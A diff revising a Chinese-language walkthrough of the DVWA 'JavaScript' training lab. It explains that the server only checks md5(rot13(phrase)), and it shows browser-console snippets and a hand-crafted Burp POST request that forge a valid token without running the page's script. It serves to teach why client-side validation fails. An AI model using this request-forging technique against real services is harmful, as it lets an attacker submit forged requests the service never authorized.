@@ -27,13 +27,40 @@ token=8b479aefbd90795395b3e7089ae0dc09&phrase=success&send=Submit
 
 | 参数 | 含义 |
 |---|---|
-| `phrase` | 你要提交的短语（下拉框里选 success / failure） |
-| `token` | **由页面上的 JavaScript 计算出来的校验值** |
+| `phrase` | 你想提交的短语（**手动输入**，不是下拉框） |
+| `token` | **由页面上的 JavaScript 计算出来的校验值**（也是输入框） |
 | `send` | 提交按钮 |
 
-**服务器的校验逻辑是**：token 是否等于「根据 phrase 算出来的某个值」。
+### 界面长什么样
 
-**"通关"的标准是**：让服务器接受一个**不是它预期值**的 phrase。
+这个模块是一个**填空式表单**，两个框都要自己填：
+
+```
+┌─────────────────────────────────────┐
+│  Phrase:  [ ____________ ]          │
+│  Token:   [ ____________ ]          │
+│           [ Submit ]                │
+└─────────────────────────────────────┘
+```
+
+**正常流程**：你输入 Phrase，页面上的 JS 自动帮你算出 Token 填进去，你不需要知道算法。
+
+**关键提问**：如果 Token 是页面自动算的，那攻击者怎么绕过？
+
+### 服务器的校验逻辑
+
+```php
+if ( $phrase == "success" && $token == md5(rot13($phrase)) ) {
+    // 通过
+}
+```
+
+**两个条件必须同时满足**：
+
+1. `phrase` 必须是 `success`
+2. `token` 必须等于 `md5(rot13(phrase))`
+
+**"通关"就是让服务器接受你的提交。**
 
 ### 核心命题：客户端校验等于没有校验
 
@@ -125,45 +152,96 @@ document.getElementById("token").value = md5(rot13(phrase));
 | token 只依赖用户输入 | token 绑定**服务端会话状态** |
 | 算法写在客户端 | 算法和密钥都在服务端 |
 
-### 第 3 步：构造攻击
+### 第 3 步：先通过 —— 把答案填出来
 
-**目标**：提交一个非法 phrase（比如 `Hack`），但让服务器接受。
+**因为服务器要的就是 `success`，所以第一步是正常通关。**
 
-```
-① 算 rot13("Hack")   →  "Unpx"
-② 算 md5("Unpx")     →  32 位哈希
-③ 用这个哈希作为 token，phrase 填 Hack，发出请求
-```
+| 框 | 填什么 |
+|---|---|
+| **Phrase** | `success` |
+| **Token** | `md5(rot13('success'))` 算出的 32 位字符串 |
 
-**服务器算出的 `md5(rot13("Hack"))` 和你的 token 一致 → 校验通过。**
+**Token 怎么来（两种方式）：**
 
-**服务器无法区分**：这个 token 是页面 JS 算的，还是攻击者自己算的。
+**① 让页面自动算**（正常用户的方式）
 
-### 第 4 步：实操 —— 四种方式
-
-**方式 A：Burp Repeater（最直接）**
-
-1. 正常提交一次 `success`，用 Burp 抓包
-2. 右键 → **Send to Repeater**
-3. 修改请求体：
-
-```
-token=<你算出的 md5>&phrase=Hack&send=Submit
-```
-
-4. 点 **Send**，观察响应
-
-**方式 B：F12 Console 直接算（最省事，推荐首选）**
-
-**页面自带的 `md5()` 和 `rot13()` 函数可以直接调用** —— 因为上面那段源码已经在页面里定义了它们。
-
-F12 → **Console** 标签，输入：
+输入 `Phrase` 后，页面上的 `generate_token()` 会自动填充 Token 框。
+**如果没自动填**，就在 Console 里手动调一次：
 
 ```javascript
-md5(rot13('Hack'))
+document.getElementById('token').value = md5(rot13('success'));
 ```
 
-**直接返回 32 位合法 token。** 连在线 MD5 工具都不用找。
+**② 自己算**（攻击者的方式 —— 这就是漏洞）
+
+F12 → **Console**：
+
+```javascript
+md5(rot13('success'))
+```
+
+复制返回的 32 位字符串，粘贴进 Token 框。
+
+**点 Submit → 通过。**
+
+!!! success "实测结果"
+
+    ```
+    Phrase : success
+    Token  : md5(rot13("success"))
+    结果   : 服务器接受 ✅
+    ```
+
+    **注意**：Token 是**你自己算出来的**，而不是页面给的 ——
+    但服务器**完全无法区分**这两者。这就是漏洞的实证。
+
+### 第 4 步：核心问题 —— 那这算漏洞吗
+
+**"填出 success"本身不算攻击**，它只是通关条件。
+
+**真正的漏洞在这里**：
+
+> **服务器想用 token 来证明「这个请求是从我的页面发出的」。**
+> **但 token 的算法公开在客户端，输入也由用户控制 —— 所以谁都能算。**
+
+**攻击者能做的三件事（这才是漏洞的价值）：**
+
+| # | 做法 | 说明 |
+|---|---|---|
+| ① | **绕过页面直接构造请求** | 用 Burp / curl 直接发，完全不加载页面 JS |
+| ② | **改客户端的校验逻辑** | F12 改 JS，让它返回任意值 |
+| ③ | **重放** | 因为 token 是纯函数、无随机数，同一个 phrase 永远对应同一个 token |
+
+**所以：如果这个机制被用来保护真实业务**（比如"验证用户是否有权限提交这个金额"），
+**攻击者就能伪造任意合法请求。**
+
+### 第 5 步：用 Burp 演示"完全绕过页面"
+
+这是最能说明问题的一步 —— **证明不需要浏览器、不需要 JS**：
+
+```http
+POST /dvwa/vulnerabilities/javascript/ HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Cookie: security=low; PHPSESSID=你的session
+
+token=<你自己算的md5>&phrase=success&send=Submit
+```
+
+**关键**：这个请求是手工构造的，**页面上的 JS 一行都没跑**。
+
+**服务器照样接受** —— 因为它只比对 token 和 phrase 是否匹配，
+**从不检查这个 token 是不是它的页面算的。**
+
+### 第 6 步：其他几种实操方式
+
+**方式 A：F12 Console 自己算（最省事，推荐）**
+
+**页面自带的 `md5()` 和 `rot13()` 函数可以直接调用** —— 因为源码已经在页面里定义了它们。
+
+```javascript
+md5(rot13('success'))     // 得到合法 token
+```
 
 **先验证 rot13 的行为**（理解算法）：
 
@@ -171,58 +249,63 @@ md5(rot13('Hack'))
 ['Hack','success','failure'].forEach(p => console.log(p, '->', rot13(p)));
 ```
 
-输出（已交叉验证）：
+输出（已用 Node 与 Python 双实现交叉验证）：
 
 | 输入 | rot13 后 |
 |---|---|
-| `Hack` | `Unpx` |
 | `success` | `fhpprff` |
 | `failure` | `snvyher` |
+| `Hack` | `Unpx` |
 | `Pwned` | `Cjarq` |
 | `ABCDEFG` | `NOPQRST` |
 
-**规律很清楚**：字母表位移 13 位，大小写各自独立（`A`↔`N`、`a`↔`n`）。
+**规律**：字母表位移 13 位，大小写各自独立（`A`↔`N`、`a`↔`n`）。
 
-**然后一次性设置表单并提交：**
+**方式 B：一键填表并提交**
 
 ```javascript
-document.getElementById('phrase').value = 'Hack';
-document.getElementById('token').value = md5(rot13('Hack'));
+document.getElementById('phrase').value = 'success';
+document.getElementById('token').value  = md5(rot13('success'));
 ```
 
 回到页面点 **Submit**。
 
-!!! success "实测结果"
+**方式 C：改 JS 逻辑（演示"客户端代码不可信"）**
 
-    ```
-    payload : phrase=Hack
-              token=md5(rot13("Hack"))
-    结果    : 服务器接受 ✅
-    ```
-
-    **关键**：`Hack` 不是下拉框里的合法选项（只有 `success` / `failure`），
-    但服务器照样接受了 —— 因为 token 在数学上是正确的。
-
-**方式 C：改 JS 逻辑（最能说明问题）**
-
-F12 → **Elements** → 双击那段 `<script>` → 把校验改成永远通过：
+F12 → **Elements** → 双击那段 `<script>` → 改掉 `generate_token()`：
 
 ```javascript
-// 原来是 md5(rot13(phrase))，改成固定值
+// 原来：document.getElementById("token").value = md5(rot13(phrase));
+// 改成固定值：
 document.getElementById("token").value = "anything";
 ```
 
-**这直接演示了「客户端代码完全不可信」。**
+**结果**：服务器**会拒绝** —— 因为算出的值不等于 `md5(rot13("success"))`。
 
-**方式 D：在线工具**
+!!! tip "这一步的结论很关键"
 
-用任意在线 MD5 工具算 `md5("Unpx")`。
+    **改客户端能骗过页面，但骗不过服务器。**
 
-### 第 5 步：验证
+    这反而更准确地说明了问题：**客户端代码可以被任意篡改，
+    所以服务器绝不能依赖它计算出的任何结果。**
 
-提交后，服务器返回成功提示，**而且接受的 phrase 不是我方预设的合法值**。
+**方式 D：在线 MD5 工具**
 
-**这就证明了**：攻击者不需要通过页面，就能构造出"合法"的请求。
+手动算 `md5("fhpprff")`（`fhpprff` 是 `success` 的 rot13 结果）—— 任意在线工具都行。
+
+### 第 7 步：验证
+
+提交后出现成功提示。
+
+**验证要点**：
+
+| 检查 | 说明 |
+|---|---|
+| Token 是你自己算的 | 没依赖页面自动填充 |
+| 用 Burp 手工构造也能过 | 证明**完全不需要浏览器** |
+| 同一个 phrase 永远同一个 token | 说明**可重放** |
+
+**第 2 条最重要** —— 它证明这个校验机制**对外部攻击者完全无效**。
 
 ---
 
